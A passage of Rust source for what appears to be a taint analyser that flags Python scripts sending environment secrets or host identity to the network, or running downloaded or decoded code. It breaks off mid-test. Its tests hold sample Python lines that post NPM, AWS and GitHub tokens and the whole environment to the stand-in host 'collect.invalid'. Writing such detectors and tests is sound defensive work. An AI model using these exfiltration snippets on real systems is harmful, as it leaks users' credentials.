            } else if let Some(a) = pos.get(index) {
                // (the caller's address: what is received depends on it)
                if !a.params.is_empty() {
                    got = Taint { params: a.params.clone(), clean: 0, marks: FETCHED, ..Taint::empty() };
                }
            }
        }
        if member && recv.marks & OBJ_CONN != 0 && method.as_deref().is_some_and(|m| is_one(m, CONN_READS)) {
            got = got.union(&self.sc_source(K_RECEIVED, u("a connection"), at, 0));
        }
        // a download's output is received
        if any_of(&names, CAPTURES) && self.sc_download(call) {
            return Ok(self.sc_source(K_RECEIVED, u("a download"), at, 0));
        }
        // a container a value is put into holds it
        if member && method.as_deref().is_some_and(|m| is_one(m, COLLECTS)) {
            let obj = a_(self.t(), func);
            if self.t().kind(obj) == Kind::Name {
                let sid = a_(self.t(), obj);
                let k = self.name_of(sid);
                let mut held = self.name_taint(k);
                for v in pos.iter().chain(kws.iter().map(|(_, v)| v)) {
                    held = held.union(&v.plain());
                }
                if let Some(s) = starred {
                    held = held.union(&s.plain());
                }
                if let Some(d) = dstar {
                    held = held.union(&d.plain());
                }
                let data = held.source || held.marks != 0;
                self.env.insert(key(k), held);
                if data {
                    self.sc_mutate(k);
                }
            } else if matches!(self.t().kind(obj), Kind::Attribute | Kind::Subscript) {
                // (`self.items.append(…)`, `d['m'].update(…)`: what holds the container)
                let mut given: Vec<Taint> = pos.iter().chain(kws.iter().map(|(_, v)| v)).map(|v| v.plain()).collect();
                if let Some(s) = starred {
                    given.push(s.plain());
                }
                if let Some(d) = dstar {
                    given.push(d.plain());
                }
                let held = super::union_all(&given);
                if held.source || held.marks != 0 {
                    self.assign(obj, &recv.plain().union(&held))?;
                }
            }
        }
        // a number or a flag: not the data
        let last: PyStr = match &method {
            Some(m) => m.clone(),
            None => names.first().map(|n| last_part(n).to_vec()).unwrap_or_default(),
        };
        if any_of(&names, NUMERIC) || (res.class.clean_result && !is_one(&last, KEEPS)) {
            return Ok(got);
        }
        // a child process: not what it was given (what it prints is local
        // data only for a command known to print some: sc_source_call)
        if any_of(&names, PROCESSES) || any_of(&names, RUNNERS) {
            return Ok(got);
        }
        // the script's own functions
        let mut v;
        if !res.targets.is_empty() {
            v = self.sc_apply(call, &res.targets, pos, starred, kws, dstar, at);
            if res.ctor.is_some() || !res.precise {
                let env_id = self.p.names.find(&u("env"));
                let plains: Vec<Taint> =
                    pos.iter().chain(kws.iter().filter(|(k, _)| Some(*k) != env_id).map(|(_, v)| v)).map(|a| a.plain()).collect();
                v = v.union(&super::union_all(&plains));
            }
        } else if any_of(&names, LOOKUPS) {
            // (what a lookup answers for the machine's own name is the
            // machine's address: what the name held)
            let plains: Vec<Taint> = pos.iter().map(|a| a.plain()).collect();
            v = super::union_all(&plains);
        } else if request || send_spec(&names).is_some() || spec.is_some() {
            // (a response holds what was received, not what was sent)
            v = Taint::empty();
        } else if let Some(r) = self.sc_lambda_call(func, pos, starred, kws)? {
            v = r;
        } else {
            // (the environment a call is given as `env=` is a program's: the text follower seals it)
            let env_id = self.p.names.find(&u("env"));
            let mut plains: Vec<Taint> =
                pos.iter().chain(kws.iter().filter(|(k, _)| Some(*k) != env_id).map(|(_, v)| v)).map(|a| a.plain()).collect();
            if let Some(s) = starred {
                plains.push(s.plain());
            }
            if let Some(d) = dstar {
                plains.push(d.plain());
            }
            v = super::union_all(&plains).union(&recv.plain());
        }
        v = v.union(&got);
        // (`p.read_bytes()`: the file's bytes)
        if let Some(b) = &bytes {
            v = v.union(b);
        }
        // a decoder: what it returns is decoded data (`b64decode(x)`,
        // `Fernet(k).decrypt(d)`, `map(chr, codes)`; `chr(c) for c in codes`
        // is the comprehension's)
        let map_chr = any_of_ascii(&names, &["map"]) && {
            let t = self.t();
            arg_nodes.first().is_some_and(|&f| t.kind(f) == Kind::Name && eq(t.str(a_(t, f)), "chr"))
        };
        if any_of_ascii(&names, DECODERS) || (member && method.as_deref().is_some_and(|m| is_one_ascii(m, DECODER_METHODS))) || map_chr {
            let what = names.first().cloned().unwrap_or_else(|| u("a decoder"));
            v = v.union(&self.sc_source(K_DECODED, what, at, 0));
        }
        // what the call makes: a connection, a client
        let mut mark = 0u8;
        if any_of(&names, CONNECTIONS) {
            mark |= OBJ_CONN;
        }
        if any_of(&names, CLIENTS) {
            mark |= OBJ_CLIENT;
        }
        if any_of(&names, REQUEST_OBJECTS) {
            mark |= OBJ_REQUEST;
            // (addressed to the instance's metadata, or a public-IP service)
            if let (Some(&f), Some(&l)) = (arg_nodes.first(), arg_nodes.last()) {
                let sup = self.sup();
                let p = sup.p();
                let (lo, hi) = (self.t().node(f).start, self.t().node(l).end);
                let mut texts: Vec<PyStr> = vec![sup.span(lo, hi).to_vec()];
                if self.t().kind(f) == Kind::Name {
                    if let Some(values) = self.sc_const_strs(f, 0) {
                        texts.extend(values);
                    }
                }
                if texts.iter().any(|t| p.re("_LD_METADATA_RE").search(t).is_some()) {
                    mark |= OBJ_IMDS;
                } else if texts.iter().any(|t| p.re("_LD_PUBLIC_IP_RE").search(t).is_some()) {
                    mark |= OBJ_PUBLIC_IP;
                }
            }
        }
        if member && method.as_deref().is_some_and(|m| is_one(m, CONN_CHAIN))
            && (recv.marks & OBJ_CONN != 0 || pos.iter().any(|a| a.marks & OBJ_CONN != 0))
        {
            mark |= OBJ_CONN;
        }
        if mark != 0 {
            v = Taint { marks: v.marks | mark, ..v };
        }
        Ok(v)
    }

    /// supply mode: `os.environ['P'] = v` (`base` the value of `os.environ`):
    /// what the script stores in a variable of the environment.
    pub(super) fn sc_env_write(&mut self, base: &Taint, slice: NodeId, t: &Taint) {
        if base.marks & OBJ_ENV == 0 || !t.tainted() {
            return;
        }
        let name = match self.sc_const_str(slice) {
            Some(n) => n,
            None => return,
        };
        let sup = self.sup();
        let mut store = sup.env_store.borrow_mut();
        let new = match store.get(&name) {
            Some(o) => o.union(&t.plain()).as_source(),
            None => t.plain().as_source(),
        };
        if store.get(&name) != Some(&new) {
            store.insert(name, new);
            self.sc_dirty = true;
        }
    }

    /// supply mode: `obj.attr = v` (an object of the function's, not the
    /// receiver's): the object holds v.
    pub(super) fn sc_member_write(&mut self, base: NameId, t: &Taint) {
        if !t.tainted() {
            return;
        }
        let held = self.name_taint(base).union(&t.plain());
        self.env.insert(key(base), held);
    }

    /// supply mode, at the end of a reading: the variables a nested def may
    /// read (what this function gives them), and the module's globals this
    /// function declares and assigns. Did either change?
    pub(super) fn sc_commit(&mut self) -> bool {
        let f = self.f;
        let mut changed = false;
        let has_nested = {
            let sup = self.sup();
            let mut nesting = sup.nesting.borrow_mut();
            if nesting.as_ref().map_or(true, |v| v.len() != self.p.fns.len()) {
                let mut v = vec![false; self.p.fns.len()];
                for g in &self.p.fns {
                    if let Some(pf) = g.parent {
                        v[pf as usize] = true;
                    }
                }
                *nesting = Some(v);
            }
            nesting.as_ref().map_or(false, |v| v[f as usize])
        };
        if has_nested {
            let entries: Vec<(NameId, Taint)> = self
                .env
                .iter()
                .filter(|(k, v)| **k >> 32 == 0 && (v.source || v.marks != 0))
                .map(|(k, v)| (*k as NameId, v.as_source()))
                .collect();
            let vars = self.p.closure.entry(f).or_default();
            for (name, t) in entries {
                let new = match vars.get(&name) {
                    None => t,
                    Some(o) => o.union(&t).as_source(),
                };
                if vars.get(&name) != Some(&new) {
                    vars.insert(name, new);
                    changed = true;
                }
            }
        }
        // `nonlocal x`, and a container of the function around this one that
        // it fills: what the variable holds there too
        let mut back: Vec<(FnId, NameId)> = std::mem::take(&mut self.sc_mutated_back);
        for n in self.sc_nonlocal_decls() {
            if let Some(f) = self.sc_binder(n) {
                if !back.contains(&(f, n)) {
                    back.push((f, n));
                }
            }
        }
        for (f, n) in back {
            let v = match self.env.get(&key(n)) {
                Some(v) if v.source || v.marks != 0 => v.as_source(),
                _ => continue,
            };
            let vars = self.p.closure_back.entry(f).or_default();
            let new = match vars.get(&n) {
                None => v,
                Some(o) => o.union(&v).as_source(),
            };
            if vars.get(&n) != Some(&new) {
                vars.insert(n, new);
                changed = true;
            }
        }
        // `global x`: x is the module's; so is a container of the module's
        // the function puts values in
        let mut declared = self.sc_global_decls();
        for n in std::mem::take(&mut self.sc_mutated) {
            if !declared.contains(&n) {
                declared.push(n);
            }
        }
        if !declared.is_empty() {
            let m = self.m;
            let entries: Vec<(NameId, Taint)> = declared
                .iter()
                .filter_map(|&n| self.env.get(&key(n)).filter(|v| v.source || v.marks != 0).map(|v| (n, v.as_source())))
                .collect();
            let globals = &mut self.p.mods[m as usize].globals;
            for (name, t) in entries {
                let new = match globals.get(&name) {
                    None => t,
                    Some(o) => o.union(&t).as_source(),
                };
                if globals.get(&name) != Some(&new) {
                    globals.insert(name, new);
                    changed = true;
                }
            }
        }
        changed
    }

    /// The names a function declares `global`.
    fn sc_global_decls(&mut self) -> Vec<NameId> {
        if let Some(d) = self.p.global_decls.get(&self.f) {
            return d.clone();
        }
        let mut out: Vec<NameId> = Vec::new();
        if !self.p.fns[self.f as usize].pseudo {
            let fnode = self.p.fns[self.f as usize].node;
            let body: Vec<u32> = body_of(self.t(), fnode).to_vec();
            for n in own_nodes(self.t(), &body) {
                if self.t().kind(n) == Kind::Global {
                    let sids: Vec<u32> = {
                        let t = self.t();
                        t.list(a_(t, n)).to_vec()
                    };
                    for sid in sids {
                        let k = self.name_of(sid);
                        if !out.contains(&k) {
                            out.push(k);
                        }
                    }
                }
            }
        }
        self.p.global_decls.insert(self.f, out.clone());
        out
    }

    /// supply mode: `name`, a container a value was put in (`INFO['h'] = …`,
    /// `DATA.append(…)`): in a function that binds no such name, nor one
    /// around it, the module's, which the function's reading commits.
    pub(super) fn sc_mutate(&mut self, name: NameId) {
        let func = &self.p.fns[self.f as usize];
        if func.pseudo || func.local_names.contains(&name) || func.pnames.contains(&name) {
            return;
        }
        let mut at = func.parent;
        let mut hops = 0;
        while let Some(f) = at {
            if hops > 16 {
                return;
            }
            if self.p.fns[f as usize].local_names.contains(&name) {
                // (the variable of a function around this one: that function's)
                if !self.sc_mutated_back.contains(&(f, name)) {
                    self.sc_mutated_back.push((f, name));
                }
                return;
            }
            at = self.p.fns[f as usize].parent;
            hops += 1;
        }
        if !self.sc_mutated.contains(&name) {
            self.sc_mutated.push(name);
        }
    }

    /// The function around this one that binds `name` (a `nonlocal`'s).
    fn sc_binder(&self, name: NameId) -> Option<FnId> {
        let mut at = self.p.fns[self.f as usize].parent;
        let mut hops = 0;
        while let Some(f) = at {
            if hops > 16 {
                return None;
            }
            if self.p.fns[f as usize].local_names.contains(&name) {
                return Some(f);
            }
            at = self.p.fns[f as usize].parent;
            hops += 1;
        }
        None
    }

    /// The names a function declares `nonlocal`.
    fn sc_nonlocal_decls(&mut self) -> Vec<NameId> {
        if let Some(d) = self.p.nonlocal_decls.get(&self.f) {
            return d.clone();
        }
        let mut out: Vec<NameId> = Vec::new();
        if !self.p.fns[self.f as usize].pseudo {
            let fnode = self.p.fns[self.f as usize].node;
            let body: Vec<u32> = body_of(self.t(), fnode).to_vec();
            for n in own_nodes(self.t(), &body) {
                if self.t().kind(n) == Kind::Nonlocal {
                    let sids: Vec<u32> = {
                        let t = self.t();
                        t.list(a_(t, n)).to_vec()
                    };
                    for sid in sids {
                        let k = self.name_of(sid);
                        if !out.contains(&k) {
                            out.push(k);
                        }
                    }
                }
            }
        }
        self.p.nonlocal_decls.insert(self.f, out.clone());
        out
    }

    /// Does the statement or expression `n` make a call (looked for in its
    /// first 100,000 nodes)?
    fn sc_has_call(&self, n: NodeId) -> bool {
        let t = self.t();
        let mut stack = vec![n];
        let mut seen = 0usize;
        while let Some(x) = stack.pop() {
            seen += 1;
            if x == NONE || seen > 100_000 {
                return false;
            }
            if t.kind(x) == Kind::Call {
                return true;
            }
            t.each_child(x, |c| stack.push(c));
        }
        false
    }

    /// supply mode: a class's own statements, run when the class is defined:
    /// a send among them is the module's, and what its plain assignments give
    /// a name is the class's attribute (what `self.x` reads).
    pub(super) fn sc_class_body(&mut self, st: NodeId) -> Result<(), Halt> {
        let body: Vec<u32> = body_of(self.t(), st).to_vec();
        let cls = {
            let m = self.m;
            self.p.classes.iter().position(|c| c.node == st && c.module == m).map(|i| i as ClsId)
        };
        let saved = self.env.clone();
        let mut attrs: Vec<(NameId, Taint)> = Vec::new();
        for x in body {
            // (a def is its own function; a statement with no call, a table of
            // data, sends and reads nothing)
            if matches!(self.t().kind(x), Kind::FunctionDef | Kind::AsyncFunctionDef) || !self.sc_has_call(x) {
                continue;
            }
            self.stmt(x)?;
            let target = {
                let t = self.t();
                if t.kind(x) == Kind::Assign {
                    let targets = t.list(a_(t, x));
                    (targets.len() == 1 && t.kind(targets[0]) == Kind::Name).then(|| a_(t, targets[0]))
                } else {
                    None
                }
            };
            if let Some(sid) = target {
                let k = self.name_of(sid);
                if let Some(v) = self.env.get(&key(k)).cloned() {
                    if v.source || v.marks != 0 {
                        attrs.push((k, v.as_source()));
                    }
                }
            }
        }
        self.env = saved;
        if let Some(c) = cls {
            let cls = &mut self.p.classes[c as usize];
            for (k, v) in attrs {
                let new = match cls.attr_taint.get(&k) {
                    None => v,
                    Some(o) => o.union(&v).as_source(),
                };
                if cls.attr_taint.get(&k) != Some(&new) {
                    cls.attr_taint.insert(k, new);
                    self.sc_dirty = true;
                }
            }
        }
        Ok(())
    }

    /// supply mode: a parameter's default is its value where a call gives
    /// none (`def send(d=socket.gethostname())`), read where the def is.
    pub(super) fn sc_defaults(&mut self, fnode: NodeId) -> Result<(), Halt> {
        let pairs = {
            let t = self.t();
            if !matches!(t.kind(fnode), Kind::FunctionDef | Kind::AsyncFunctionDef) {
                return Ok(());
            }
            let args = b_(t, fnode);
            if args == NONE {
                return Ok(());
            }
            let func = &self.p.fns[self.f as usize];
            let positional: Vec<NameId> = func.posonly.iter().chain(func.args.iter()).copied().collect();
            let defaults = t.list(ext(t, args, 3));
            let kw_defaults = t.list(ext(t, args, 1));
            let mut pairs: Vec<(NameId, NodeId)> = Vec::new();
            if defaults.len() <= positional.len() {
                let off = positional.len() - defaults.len();
                for (i, &d) in defaults.iter().enumerate() {
                    pairs.push((positional[off + i], d));
                }
            }
            for (i, &d) in kw_defaults.iter().enumerate() {
                if let (true, Some(&n)) = (d != NONE, func.kwonly.get(i)) {
                    pairs.push((n, d));
                }
            }
            pairs
        };
        for (name, d) in pairs {
            let v = self.expr(d)?.plain();
            if v.source || v.marks != 0 {
                let cur = self.env.get(&key(name)).cloned().unwrap_or_else(Taint::empty);
                self.env.insert(key(name), cur.union(&v));
            }
        }
        Ok(())
    }

    /// supply mode: a call of a name given a lambda (`g = lambda: …; g()`):
    /// the lambda's body read with its parameters given the call's
    /// arguments, its value the call's. None when the name holds no lambda.
    pub(super) fn sc_lambda_call(
        &mut self,
        func: NodeId,
        pos: &[Taint],
        starred: Option<&Taint>,
        kws: &[(NameId, Taint)],
    ) -> Result<Option<Taint>, Halt> {
        if self.t().kind(func) != Kind::Name || self.sc_inline >= 3 {
            return Ok(None);
        }
        let name = self.t().str(a_(self.t(), func)).to_vec();
        let lambdas = self.sc_lambdas(&name);
        if lambdas.is_empty() {
            return Ok(None);
        }
        let mut out = Taint::empty();
        for lam in lambdas {
            let (params, body) = {
                let t = self.t();
                let args = a_(t, lam);
                let mut ps: Vec<u32> = Vec::new();
                if args != NONE {
                    ps.extend(t.list(a_(t, args)).iter().chain(t.list(b_(t, args)).iter()).map(|&a| a_(t, a)));
                }
                (ps, b_(t, lam))
            };
            let saved = self.env.clone();
            for (i, sid) in params.iter().enumerate() {
                let k = self.name_of(*sid);
                let given = pos.get(i).cloned().or_else(|| kws.iter().find(|(n, _)| *n == k).map(|(_, v)| v.clone()));
                let v = given.or_else(|| starred.cloned()).map(|v| v.plain()).unwrap_or_else(Taint::empty);
                self.env.insert(key(k), v);
            }
            self.sc_inline += 1;
            let r = self.expr(body);
            self.sc_inline -= 1;
            self.env = saved;
            out = out.union(&r?.plain());
        }
        Ok(Some(out))
    }

    /// The lambdas a name is given (`g = lambda: …`), in the function or the
    /// module.
    fn sc_lambdas(&mut self, name: &[u32]) -> Vec<NodeId> {
        let fns = {
            let mut v = vec![self.f];
            let body_fn = self.p.mods[self.m as usize].body_fn;
            if body_fn != self.f {
                v.push(body_fn);
            }
            v
        };
        let mut out: Vec<NodeId> = Vec::new();
        for f in fns {
            let ix = self.sc_index(f);
            if let Some(vs) = ix.assigns.get(name) {
                let t = self.t();
                out.extend(vs.iter().copied().filter(|&v| t.kind(v) == Kind::Lambda));
            }
            if !out.is_empty() {
                break;
            }
        }
        out.truncate(4);
        out
    }
}

// ---------------------------------------------------------------- the answer --

/// The names that hold a path outside the package (core's `outside`, read
/// from the module's assignments), with the text each was first given.
fn outside_names(tree: &Tree, sup: &Supply) -> (HashSet<PyStr>, HashMap<PyStr, PyStr>) {
    let p = sup.p();
    let path_expr = p.re("_LD_PATH_EXPR_RE");
    let own_folder = p.re("_LD_OWN_FOLDER_RE");
    let fs_root = p.re("_LD_FS_ROOT_RE");
    let home = p.re("_LD_HOME_RE");
    let mut values: Vec<(PyStr, u32, u32)> = Vec::new();
    for id in 0..tree.nodes.len() as NodeId {
        if tree.kind(id) != Kind::Assign {
            continue;
        }
        let targets = tree.list(a_(tree, id));
        if targets.len() != 1 || tree.kind(targets[0]) != Kind::Name {
            continue;
        }
        let v = b_(tree, id);
        let n = tree.node(v);
        values.push((tree.str(a_(tree, targets[0])).to_vec(), n.start, n.end));
        if values.len() > 20_000 {
            break;
        }
    }
    let mut outside: HashSet<PyStr> = HashSet::new();
    let mut texts: HashMap<PyStr, PyStr> = HashMap::new();
    for (name, lo, hi) in &values {
        let value = pystr::strip(sup.span(*lo, *hi));
        if path_expr.match_(value).is_some()
            && own_folder.search(value).is_none()
            && (fs_root.match_(value).is_some() || home.search(value).is_some())
        {
            outside.insert(name.clone());
            texts.entry(name.clone()).or_insert_with(|| value.to_vec());
        }
    }
    for _ in 0..p.usize("_DD_PASSES") {
        if outside.is_empty() {
            break;
        }
        let mut grown = false;
        for (name, lo, hi) in &values {
            if outside.contains(name) {
                continue;
            }
            let value = sup.span(*lo, *hi);
            if path_expr.match_(pystr::lstrip(value)).is_some() && own_folder.search(value).is_none() {
                let uses = p.re("_LD_NAME_TOKEN_RE").finditer(value).any(|m| outside.contains(m.group0()));
                if uses {
                    outside.insert(name.clone());
                    texts.entry(name.clone()).or_insert_with(|| pystr::strip(value).to_vec());
                    grown = true;
                }
            }
        }
        if !grown {
            break;
        }
    }
    (outside, texts)
}

/// What the tree says about a Python text: its send of local data (the
/// strongest, `Found`, or `Nothing`), and its first received code (the
/// 1-based line and the category), if any.
#[derive(Clone, Debug)]
pub struct Facts {
    pub sent: Answer,
    pub received: Option<(usize, &'static str)>,
    /// code the script decodes, run: (the run's offset, the decoding's), in
    /// the text's order
    pub decoded: Vec<(usize, usize)>,
    /// the first file the script writes, then runs, holding code or a
    /// program it decodes, carves out of another file or downloads
    pub dropped: Option<DropRun>,
    /// the first code it reads back from itself (its file, its docstring, a
    /// data file shipped with it) and runs: the run's offset (N-19)
    pub own: Option<usize>,
}

/// The largest text the tree reads (larger: the text followers).
pub const MAX_TEXT: usize = 2_000_000;

thread_local! {
    /// The last text read and what the tree said (None: it could not say).
    static LAST: RefCell<Option<(Vec<u32>, Option<Rc<Facts>>)>> = const { RefCell::new(None) };
}

/// The tree's facts about a Python text, or None when it could not say (a
/// text the parser doesn't read, over 2 MB, or past the pass's budgets):
/// the text detectors answer then.
pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
    if text.len() > MAX_TEXT {
        return None;
    }
    if let Some(hit) = LAST.with(|l| l.borrow().as_ref().filter(|(t, _)| t.as_slice() == text).map(|(_, f)| f.clone())) {
        return hit;
    }
    let owned = text.to_vec();
    let got = crate::api::on_own_stack(move || facts_here(&owned)).map(Rc::new);
    LAST.with(|l| *l.borrow_mut() = Some((text.to_vec(), got.clone())));
    got
}

/// The strongest send of local data in a Python text, read on its tree.
pub fn local_data_sent(text: &[u32]) -> Answer {
    match facts(text) {
        Some(f) => f.sent.clone(),
        None => Answer::Unread,
    }
}

/// The first received code in a Python text, read on its tree: Some(the
/// line and category, or None), or None when the tree could not say.
pub fn received_code(text: &[u32]) -> Option<Option<(usize, &'static str)>> {
    facts(text).map(|f| f.received)
}

/// Code a Python text decodes and runs, read on its tree: Some((the run's
/// offset, the decoding's) for each), or None when the tree could not say.
pub fn decoded_runs(text: &[u32]) -> Option<Vec<(usize, usize)>> {
    facts(text).map(|f| f.decoded.clone())
}

/// Code a Python text reads back from itself and runs, read on its tree: Some(the first run's offset, or None), or
/// None when the tree could not say (N-19: in place of the text follower's `runs_own_source_at`).
pub fn own_run(text: &[u32]) -> Option<Option<usize>> {
    facts(text).map(|f| f.own)
}

/// A file a Python text writes, then runs (a dropper's), read on its tree:
/// Some(the first, or None), or None when the tree could not say.
pub fn dropped_run(text: &[u32]) -> Option<Option<DropRun>> {
    facts(text).map(|f| f.dropped.clone())
}

fn facts_here(text: &[u32]) -> Option<Facts> {
    let pack = crate::pack::current();
    let path = u("script.py");
    let tree = crate::pyparse::parse(text).ok()?;
    let sup = Rc::new(Supply::new(pack, text));
    let (outside, values) = outside_names(&tree, &sup);
    *sup.outside.borrow_mut() = outside;
    *sup.outside_values.borrow_mut() = values;
    let mut cfg = Config::new(&[], &[], &[], &[]);
    cfg.supply = Some(sup.clone());
    let findings = super::driver::analyze_with(&[(path, Some(text.to_vec()))], vec![Some(tree)], cfg);
    if findings.iter().any(|n| matches!(n, Out::Note { .. })) {
        return None;
    }
    // the strongest send: data over what only an address holds, a harvest
    // over other data, then the first; the first received code
    let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
    let mut first: Option<(u32, &'static str)> = None;
    let mut decoded: Vec<(usize, usize)> = Vec::new();
    let mut own: Option<usize> = None;
    let dropped = first_drop(text, &findings);
    for f in findings {
        match f {
            Out::Send { at, kind, what, in_address: weak } => {
                let rank = (weak, weak || !harvest_of(sup.p(), kind, &what, &sup.whole), at);
                if best.as_ref().map_or(true, |(r, _, _)| rank < *r) {
                    best = Some((rank, kind, what));
                }
            }
            Out::Received { at, cat } => {
                if first.map_or(true, |(a, _)| at < a) {
                    first = Some((at, cat));
                }
            }
            Out::Decoded { at, from } => decoded.push((at as usize, from as usize)),
            Out::Own { at } => own = Some(own.map_or(at as usize, |o: usize| o.min(at as usize))),
            _ => {}
        }
    }
    decoded.sort_unstable();
    decoded.dedup_by_key(|d| d.0);
    let sent = match best {
        Some(((weak, _, at), kind, what)) => Answer::Found(at as usize, kind, what, weak),
        None => Answer::Nothing,
    };
    let received = first.map(|(at, cat)| {
        let at = (at as usize).min(text.len());
        (text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, cat)
    });
    Some(Facts { sent, received, decoded, dropped, own })
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOST: &str = "collect.invalid";

    fn read(src: &str) -> Facts {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        facts_here(&text).unwrap_or_else(|| panic!("not read: {}", src))
    }

    fn sent(src: &str) -> Option<(&'static str, String, bool)> {
        match read(src).sent {
            Answer::Found(_at, kind, what, in_address) => {
                Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
            }
            _ => None,
        }
    }

    fn found(kind: &'static str, what: &str) -> Option<(&'static str, String, bool)> {
        Some((kind, what.to_string(), false))
    }

    /// The category of a text's first received code, if any.
    fn runs(src: &str) -> Option<&'static str> {
        read(src).received.map(|(_, cat)| cat)
    }

    fn post(v: &str) -> String {
        format!("requests.post('https://{}/c', data={})\n", HOST, v)
    }

    #[test]
    fn the_environment_by_variable_and_whole() {
        let head = "import os, json, requests\n";
        assert_eq!(sent(&format!("{}v = os.environ['NPM_TOKEN']\n{}", head, post("v"))), found("environment", "NPM_TOKEN"));
        assert_eq!(sent(&format!("{}{}", head, post("os.getenv('AWS_SECRET_ACCESS_KEY')"))), found("environment", "AWS_SECRET_ACCESS_KEY"));
        assert_eq!(sent(&format!("{}{}", head, post("os.environ.get(b'GITHUB_TOKEN')"))), found("environment", "GITHUB_TOKEN"));
        assert_eq!(sent(&format!("{}{}", head, post("json.dumps(dict(os.environ))"))), found("environment", "the whole environment"));
        assert_eq!(sent(&format!("{}d = os.environ.copy()\n{}", head, post("d"))), found("environment", "the whole environment"));
        assert_eq!(sent(&format!("from os import environ\nimport requests\n{}", post("str(environ)"))), found("environment", "the whole environment"));
        // a variable no client keeps secret, a selection of variables, the
        // environment handed to a child process: not local data sent
        assert_eq!(sent(&format!("{}{}", head, post("os.environ.get('CI')"))), None);
        let selected = format!("{}opts = {{k: v for k, v in os.environ.items() if k.startswith('X_')}}\n{}", head, post("opts"));
        assert_eq!(sent(&selected), None);
        let by_name = format!("{}opts = {{k: v for k, v in os.environ.items() if 'TOKEN' in k}}\n{}", head, post("opts"));
        assert_eq!(sent(&by_name), found("environment", "the whole environment"));
        assert_eq!(sent("import os, subprocess\nsubprocess.run(['curl', 'https://x.invalid'], env=dict(os.environ))\n"), None);
        // a local name environ is not the environment
        assert_eq!(sent(&format!("import requests\nenviron = {{}}\n{}", post("str(environ)"))), None);
    }

    #[test]
    fn the_machine_through_functions_classes_and_closures() {
        let head = "import os, socket, requests\n";
        // the script's own function, a method of its class, a closure's variable, a global
        let src = format!("{}def send(d):\n    {}send(socket.gethostname())\n", head, post("d"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!(
            "{}class C:\n    def __init__(self):\n        self.data = dict(os.environ)\n    def go(self):\n        {}C().go()\n",
            head,
            post("self.data")
        );
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        let src = format!("{}def main():\n    data = os.environ.copy()\n    def send():\n        {}    send()\nmain()\n", head, post("data"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        let src = format!("{}DATA = None\ndef init():\n    global DATA\n    DATA = dict(os.environ)\ndef send():\n    {}init()\nsend()\n", head, post("DATA"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // a thread's target given the data
        let src = format!("{}import threading\ndef send(d):\n    {}threading.Thread(target=send, args=(dict(os.environ),)).start()\n", head, post("d"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // a container the data is put into
        let src = format!("{}info = {{}}\ninfo.update({{'h': socket.gethostname()}})\n{}", head, post("info"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
    }

    #[test]
    fn the_modules_containers_lookups_defaults_and_lambdas() {
        let head = "import os, socket, getpass, requests\n";
        // a container of the module's filled in one function, sent in another
        let src = format!("{}INFO = {{}}\ndef collect():\n    INFO['h'] = socket.gethostname()\ndef send():\n    {}collect()\nsend()\n", head, post("INFO"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!("{}DATA = []\ndef collect():\n    DATA.append(getpass.getuser())\ndef send():\n    {}collect()\nsend()\n", head, post("','.join(DATA)"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // (a function's own container, or its parameter, stays its own)
        let src = format!("{}INFO = {{}}\ndef collect(INFO):\n    INFO['h'] = socket.gethostname()\ndef send():\n    {}send()\n", head, post("INFO"));
        assert_eq!(sent(&src), None);
        let src = format!("{}def collect():\n    INFO = {{}}\n    INFO['h'] = socket.gethostname()\nINFO = {{}}\n{}", head, post("INFO"));
        assert_eq!(sent(&src), None);
        // what a lookup answers for the machine's own name: its address
        let src = format!("{}ip = socket.gethostbyname(socket.gethostname())\n{}", head, post("ip"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        assert_eq!(sent(&format!("{}ip = socket.gethostbyname('example.com')\n{}", head, post("ip"))), None);
        // a parameter's default, where the call gives none
        let src = format!("{}def send(d=socket.gethostname()):\n    {}send()\n", head, post("d"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        assert_eq!(sent(&format!("{}def send(d=None):\n    {}send()\n", head, post("d"))), None);
        // a name given a lambda, called: its body
        let src = format!("{}g = lambda: socket.gethostname()\n{}", head, post("g()"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!("{}send = lambda d: {}\nsend(socket.gethostname())\n", head, post("d").trim_end());
        assert_eq!(sent(&src), found("identity", "user or host name"));
        assert_eq!(sent(&format!("{}send = lambda d: {}\nsend('x')\n", head, post("d").trim_end())), None);
        // a digest, characters' codes, a number written out: the data still
        let src = format!("{}import hashlib\n{}", head, post("hashlib.md5(socket.gethostname().encode()).hexdigest()"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!("{}{}", head, post("'-'.join(str(ord(c)) for c in getpass.getuser())"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        assert_eq!(sent(&format!("{}{}", head, post("len(socket.gethostname())"))), None);
        // names a star import gives, and Python 2's urlopen
        let src = format!("from socket import *\ns = socket(AF_INET, SOCK_STREAM)\ns.connect(('{}', 80))\ns.send(gethostname().encode())\n", HOST);
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!("from http.client import *\nimport socket\nc = HTTPSConnection('{}')\nc.request('GET', '/' + socket.gethostname())\n", HOST);
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!("import urllib, socket\nurllib.urlopen('https://{}/?h=' + socket.gethostname())\n", HOST);
        assert_eq!(sent(&src), found("identity", "user or host name"));
    }

    #[test]
    fn containers_of_objects_closures_and_class_bodies() {
        let head = "import socket, getpass, platform, requests\n";
        // a container on self, filled in one method and sent in another
        let src = format!(
            "{}class C:\n    def __init__(self):\n        self.info = {{}}\n    def collect(self):\n        self.info['h'] = socket.gethostname()\n    def send(self):\n        {}c = C()\nc.collect()\nc.send()\n",
            head,
            post("self.info")
        );
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!(
